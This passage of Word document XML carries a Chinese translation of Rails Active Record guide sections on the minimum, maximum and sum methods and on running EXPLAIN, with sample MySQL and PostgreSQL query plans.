      <w:hyperlink r:id="rId281" w:anchor="21" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>计算</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C88B15F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>21.3 最小值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63096333" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想知道你的数据库中某些方面的最小值，你可以在数据表对应的类上使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>minmum</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。这个方法大致像下面这样调用：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2736"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0C262CC3" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A2F859F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1129861565"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.minimum("age")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2F8FDC07" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">想知道更多用法，可以参见父章节： </w:t>
      </w:r>
      <w:hyperlink r:id="rId282" w:anchor="21" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>计算</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF8D24F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>21.4 最大值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A8EB67" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想知道你的数据库中某些方面的最大值，你可以在数据表对应的类上使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>maximum</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。这个方法大致像下面这样调用：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2736"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="66DF974F" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B5BABED" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="944849731"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.maximum("age")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2ABCA757" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">想知道更多用法，可以参见父章节： </w:t>
      </w:r>
      <w:hyperlink r:id="rId283" w:anchor="21" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>计算</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226C6ED4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>21.5 总和</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34E473AA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想知道你的数据库中某些方面的总和，你可以在数据表对应的类上使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>sum</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。这个方法大致像下面这样调用：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3336"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="21BEDE43" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B360086" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1799567444"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.sum("orders_count")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3261720E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">想知道更多用法，可以参见父章节： </w:t>
      </w:r>
      <w:hyperlink r:id="rId284" w:anchor="21" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>计算</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F614206" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">22 执行 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="312ED033" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你可以在查询上面执行 relation 触发的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。比如说：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5184"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="56FFBB6F" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6BF5FD35" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1527214135"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User.where(:id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1).joins(:posts).explain</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2BC681CB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>在 MySQL 下可能产生如下结果：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="6BE24A01" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="796E14DF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>EXPLAIN for: SELECT `users`.* FROM `users` INNER JOIN `posts` ON `posts`.`user_id` = `users`.`id` WHERE `users`.`id` = 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F239DD5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+----+-------------+-------+-------+---------------+---------+---------+-------+------+-------------+</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="646AC0BB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>| id | select_type | table | type  | possible_keys | key     | key_len | ref   | rows | Extra       |</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E70A34B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+----+-------------+-------+-------+---------------+---------+---------+-------+------+-------------+</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72355A85" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|  1 | SIMPLE      | users | const | PRIMARY       | PRIMARY | 4       | const |    1 |             |</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03DE9E46" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|  1 | SIMPLE      | posts | ALL   | NULL          | NULL    | NULL    | NULL  |    1 | Using where |</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E6AA3F2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+----+-------------+-------+-------+---------------+---------+---------+-------+------+-------------+</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C203D74" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>2 rows in set (0.00 sec)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="633DF169" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Record 模拟数据库引擎并以一个清晰的格式打印出结果。所以，同样的查询在 PostgreSQL 中可能会像下面这样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="057BF59B" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A633C75" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>EXPLAIN for: SELECT "users".* FROM "users" INNER JOIN "posts" ON "posts"."user_id" = "users"."id" WHERE "users"."id" = 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C134340" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>                                  QUERY PLAN</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A07B38E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>------------------------------------------------------------------------------</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14804F77" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> Nested Loop Left Join  (cost=0.00..37.24 rows=8 width=0)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19754BE5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   Join Filter: (posts.user_id = users.id)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43ED447E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   -&gt;  Index Scan using users_pkey on users  (cost=0.00..8.27 rows=1 width=4)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00696760" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>         Index Cond: (id = 1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66AF79EE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   -&gt;  Seq Scan on posts  (cost=0.00..28.88 rows=8 width=4)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74E5982B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>         Filter: (posts.user_id = 1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="270BA9C0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(6 rows)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F8A0064" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">预加载在数据库引擎盖下面会触发多个查询，并且某些查询可能需要用到之前一些查询的结果。所有， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>explain</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法先执行查询，再做查询计划。比如说：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5544"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1E05A213" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C3DE84C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="41104610"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User.where(:id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1).includes(:posts).explain</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="59276D1F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>在 MySQL 数据库下生成</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5F129124" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="58921D45" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>EXPLAIN for: SELECT `users`.* FROM `users`  WHERE `users`.`id` = 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7879C631" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+----+-------------+-------+-------+---------------+---------+---------+-------+------+-------+</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72B535BE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>| id | select_type | table | type  | possible_keys | key     | key_len | ref   | rows | Extra |</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CDBA240" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+----+-------------+-------+-------+---------------+---------+---------+-------+------+-------+</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00EC3E35" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|  1 | SIMPLE      | users | const | PRIMARY       | PRIMARY | 4       | const |    1 |       |</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="021B1947" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+----+-------------+-------+-------+---------------+---------+---------+-------+------+-------+</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64A557BD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1 row in set (0.00 sec)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3623D3AC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="177C4F32" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>EXPLAIN for: SELECT `posts`.* FROM `posts`  WHERE `posts`.`user_id` IN (1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16F6DF3F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+----+-------------+-------+------+---------------+------+---------+------+------+-------------+</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17DF4290" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>| id | select_type | table | type | possible_keys | key  | key_len | ref  | rows | Extra       |</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B095D82" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+----+-------------+-------+------+---------------+------+---------+------+------+-------------+</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61554434" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|  1 | SIMPLE      | posts | ALL  | NULL          | NULL | NULL    | NULL |    1 | Using where |</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F266206" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+----+-------------+-------+------+---------------+------+---------+------+------+-------------+</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E8B3F92" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1 row in set (0.00 sec)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6656E865" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">22.1 自动化 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1E4E1F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Record 可以在慢查询中自动执行 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 并写入日志。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A7D686" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>这个功能需要加上配置参数来开启</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
